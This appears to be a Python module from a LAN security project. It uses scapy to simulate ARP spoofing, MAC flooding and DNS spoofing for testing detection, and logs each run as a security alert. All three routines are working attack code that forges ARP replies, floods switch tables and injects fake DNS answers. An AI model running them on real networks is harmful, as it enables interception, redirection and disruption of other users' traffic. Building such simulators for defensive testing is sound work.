"""
Attack simulation module for the LAN Security System.

This module implements various network attack simulations including ARP spoofing,
MAC flooding, and DNS spoofing for testing and demonstration purposes.
"""

import logging
import random
import time
from datetime import datetime
from typing import List, Optional, Dict, Any
from scapy.all import ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, get_if_hwaddr, get_if_addr
from scapy.interfaces import get_if_list

from ..core.interfaces import AttackSimulator, AttackType, LoggingSystem
from ..utils.logging_setup import get_logger


class NetworkAttackSimulator(AttackSimulator):
    """
    Implementation of the AttackSimulator interface for network attack simulation.
    
    This class provides methods to simulate common network attacks including
    ARP spoofing, MAC flooding, and DNS spoofing attacks.
    """
    
    def __init__(self, logging_system: Optional[LoggingSystem] = None):
        """
        Initialize the attack simulator.
        
        Args:
            logging_system: Optional logging system for attack event logging
        """
        self.logger = get_logger(__name__)
        self.logging_system = logging_system
        self._attack_history: List[Dict[str, Any]] = []
        self._supported_attacks = [
            AttackType.ARP_SPOOFING,
            AttackType.MAC_FLOODING,
            AttackType.DNS_SPOOFING
        ]
    
    def execute_arp_spoofing(self, target_ip: str, gateway_ip: str, 
                           interface: Optional[str] = None, 
                           attacker_mac: Optional[str] = None,
                           packet_count: int = 10,
                           interval: float = 1.0) -> None:
        """
        Execute ARP spoofing attack simulation.
        
        Generates malicious ARP replies to poison the victim's ARP cache,
        making the victim believe the attacker's MAC address is associated
        with the gateway's IP address.
        
        Args:
            target_ip: IP address of the victim host
            gateway_ip: IP address of the gateway/router
            interface: Network interface to use (auto-detected if None)
            attacker_mac: MAC address to use as attacker (auto-detected if None)
            packet_count: Number of malicious ARP packets to send
            interval: Time interval between packets in seconds
        """
        try:
            # Log attack initiation
            self.log_attack_initiation(AttackType.ARP_SPOOFING)
            
            # Auto-detect interface if not provided
            if interface is None:
                available_interfaces = get_if_list()
                # Filter out loopback and other non-ethernet interfaces
                interface = next((iface for iface in available_interfaces 
                                if not iface.startswith(('lo', 'docker', 'veth'))), 
                               available_interfaces[0] if available_interfaces else 'eth0')
            
            # Auto-detect attacker MAC if not provided
            if attacker_mac is None:
                try:
                    attacker_mac = get_if_hwaddr(interface)
                except:
                    # Generate a random MAC if detection fails
                    attacker_mac = "02:00:00:%02x:%02x:%02x" % (
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255)
                    )
            
            self.logger.info(f"Starting ARP spoofing attack: {target_ip} -> {gateway_ip}")
            self.logger.info(f"Using interface: {interface}, attacker MAC: {attacker_mac}")
            
            # Create malicious ARP reply packets
            for i in range(packet_count):
                # Create ARP reply claiming gateway IP belongs to attacker MAC
                arp_reply = ARP(
                    op=2,  # ARP reply
                    psrc=gateway_ip,  # Source IP (gateway)
                    pdst=target_ip,   # Destination IP (victim)
                    hwsrc=attacker_mac,  # Source MAC (attacker)
                    hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast destination
                )
                
                # Wrap in Ethernet frame
                packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac) / arp_reply
                
                # Send the malicious packet
                sendp(packet, iface=interface, verbose=False)
                
                self.logger.debug(f"Sent malicious ARP reply {i+1}/{packet_count}")
                
                if i < packet_count - 1:  # Don't sleep after the last packet
                    time.sleep(interval)
            
            # Record attack details
            attack_record = {
                'attack_type': AttackType.ARP_SPOOFING,
                'timestamp': datetime.now(),
                'target_ip': target_ip,
                'gateway_ip': gateway_ip,
                'attacker_mac': attacker_mac,
                'interface': interface,
                'packet_count': packet_count,
                'interval': interval
            }
            self._attack_history.append(attack_record)
            
            self.logger.info(f"ARP spoofing attack completed: {packet_count} packets sent")
            
        except Exception as e:
            self.logger.error(f"ARP spoofing attack failed: {str(e)}")
            raise
    
    def execute_mac_flooding(self, interface: str, packet_count: int = 1000,
                           burst_mode: bool = False, burst_size: int = 100,
                           interval: float = 0.01) -> None:
        """
        Execute MAC flooding attack simulation.
        
        Generates packets with random MAC addresses to overflow the switch's
        CAM table, potentially causing the switch to fail open and broadcast
        all traffic.
        
        Args:
            interface: Network interface to use for the attack
            packet_count: Total number of packets to send
            burst_mode: Whether to send packets in bursts
            burst_size: Number of packets per burst (if burst_mode is True)
            interval: Time interval between packets/bursts in seconds
        """
        try:
            # Log attack initiation
            self.log_attack_initiation(AttackType.MAC_FLOODING)
            
            self.logger.info(f"Starting MAC flooding attack on interface: {interface}")
            self.logger.info(f"Packet count: {packet_count}, burst mode: {burst_mode}")
            
            packets_sent = 0
            fake_macs = set()  # Track unique MAC addresses generated
            
            if burst_mode:
                # Send packets in bursts
                bursts = (packet_count + burst_size - 1) // burst_size  # Ceiling division
                
                for burst in range(bursts):
                    burst_packets = []
                    current_burst_size = min(burst_size, packet_count - packets_sent)
                    
                    for _ in range(current_burst_size):
                        # Generate random MAC address
                        fake_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255)
                        )
                        fake_macs.add(fake_mac)
                        
                        # Create Ethernet frame with fake source MAC
                        packet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst="192.168.1.1")
                        burst_packets.append(packet)
                        packets_sent += 1
                    
                    # Send burst of packets
                    sendp(burst_packets, iface=interface, verbose=False)
                    
                    self.logger.debug(f"Sent burst {burst+1}/{bursts} ({current_burst_size} packets)")
                    
                    if burst < bursts - 1:  # Don't sleep after the last burst
                        time.sleep(interval)
            else:
                # Send packets individually
                for i in range(packet_count):
                    # Generate random MAC address
                    fake_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255)
                    )
                    fake_macs.add(fake_mac)
                    
                    # Create Ethernet frame with fake source MAC
                    packet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst="192.168.1.1")
                    
                    # Send the packet
                    sendp(packet, iface=interface, verbose=False)
                    packets_sent += 1
                    
                    if i < packet_count - 1:  # Don't sleep after the last packet
                        time.sleep(interval)
            
            # Record attack details
            attack_record = {
                'attack_type': AttackType.MAC_FLOODING,
                'timestamp': datetime.now(),
                'interface': interface,
                'packet_count': packets_sent,
                'unique_macs': len(fake_macs),
                'burst_mode': burst_mode,
                'burst_size': burst_size if burst_mode else None,
                'interval': interval
            }
            self._attack_history.append(attack_record)
            
            self.logger.info(f"MAC flooding attack completed: {packets_sent} packets sent with {len(fake_macs)} unique MACs")
            
        except Exception as e:
            self.logger.error(f"MAC flooding attack failed: {str(e)}")
            raise
    
    def execute_dns_spoofing(self, target_domain: str, fake_ip: str,
                           interface: Optional[str] = None,
                           dns_server_ip: str = "8.8.8.8",
                           response_count: int = 5,
                           ttl: int = 300) -> None:
        """
        Execute DNS spoofing attack simulation.
        
        Injects false DNS responses to redirect domain queries to malicious
        IP addresses, potentially redirecting victim traffic.
        
        Args:
            target_domain: Domain name to spoof
            fake_ip: Fake IP address to return for the domain
            interface: Network interface to use (auto-detected if None)
            dns_server_ip: IP address to impersonate as DNS server
            response_count: Number of fake DNS responses to send
            ttl: Time-to-live for the fake DNS record
        """
        try:
            # Log attack initiation
            self.log_attack_initiation(AttackType.DNS_SPOOFING)
            
            # Auto-detect interface if not provided
            if interface is None:
                available_interfaces = get_if_list()
                interface = next((iface for iface in available_interfaces 
                                if not iface.startswith(('lo', 'docker', 'veth'))), 
                               available_interfaces[0] if available_interfaces else 'eth0')
            
            self.logger.info(f"Starting DNS spoofing attack: {target_domain} -> {fake_ip}")
            self.logger.info(f"Using interface: {interface}, impersonating DNS server: {dns_server_ip}")
            
            # Get local IP for source address
            try:
                local_ip = get_if_addr(interface)
            except:
                local_ip = "192.168.1.100"  # Fallback IP
            
            for i in range(response_count):
                # Create fake DNS response
                # Generate a random transaction ID
                transaction_id = random.randint(1, 65535)
                
                # Create DNS response packet
                dns_response = DNS(
                    id=transaction_id,
                    qr=1,  # Response
                    aa=1,  # Authoritative answer
                    rd=1,  # Recursion desired
                    ra=1,  # Recursion available
                    qdcount=1,  # One question
                    ancount=1,  # One answer
                    qd=DNSQR(qname=target_domain, qtype="A"),
                    an=DNSRR(rrname=target_domain, type="A", rdata=fake_ip, ttl=ttl)
                )
                
                # Wrap in UDP and IP headers
                packet = (IP(src=dns_server_ip, dst="192.168.1.255") /  # Broadcast destination
                         UDP(sport=53, dport=53) /
                         dns_response)
                
                # Send the malicious DNS response
                sendp(Ether() / packet, iface=interface, verbose=False)
                
                self.logger.debug(f"Sent fake DNS response {i+1}/{response_count} (ID: {transaction_id})")
                
                if i < response_count - 1:  # Don't sleep after the last packet
                    time.sleep(0.1)  # Short interval between DNS responses
            
            # Record attack details
            attack_record = {
                'attack_type': AttackType.DNS_SPOOFING,
                'timestamp': datetime.now(),
                'target_domain': target_domain,
                'fake_ip': fake_ip,
                'interface': interface,
                'dns_server_ip': dns_server_ip,
                'response_count': response_count,
                'ttl': ttl
            }
            self._attack_history.append(attack_record)
            
            self.logger.info(f"DNS spoofing attack completed: {response_count} fake responses sent")
            
        except Exception as e:
            self.logger.error(f"DNS spoofing attack failed: {str(e)}")
            raise
    
    def log_attack_initiation(self, attack_type: AttackType) -> None:
        """
        Log attack initiation with timestamp and attack type.
        
        Args:
            attack_type: Type of attack being initiated
        """
        timestamp = datetime.now()
        
        # Log to internal logger
        self.logger.info(f"Attack initiated: {attack_type.value} at {timestamp}")
        
        # Log to external logging system if available
        if self.logging_system:
            try:
                # Create a mock SecurityAlert for logging purposes
                from ..core.interfaces import SecurityAlert, DetectionMethod
                alert = SecurityAlert(
                    timestamp=timestamp,
                    alert_id=f"attack_sim_{int(timestamp.timestamp())}",
                    attack_type=attack_type,
                    confidence_score=1.0,  # Simulated attacks have 100% confidence
                    source_mac="00:00:00:00:00:00",  # Placeholder
                    source_ip="0.0.0.0",  # Placeholder
                    target_mac="00:00:00:00:00:00",  # Placeholder
                    target_ip="0.0.0.0",  # Placeholder
                    affected_hosts=[],
                    raw_packet_data=b"",
                    detection_method=DetectionMethod.SIGNATURE_BASED
                )
                self.logging_system.log_security_event(alert)
            except Exception as e:
                self.logger.warning(f"Failed to log to external logging system: {str(e)}")
    
    def get_supported_attacks(self) -> List[AttackType]:
        """
        Get list of supported attack types.
        
        Returns:
            List of supported AttackType enums
        """
        return self._supported_attacks.copy()
    
    def get_attack_history(self) -> List[Dict[str, Any]]:
        """
        Get history of executed attacks.
        
        Returns:
            List of attack records with details
        """
        return self._attack_history.copy()
    
    def clear_attack_history(self) -> None:
        """Clear the attack history."""
        self._attack_history.clear()
        self.logger.info("Attack history cleared")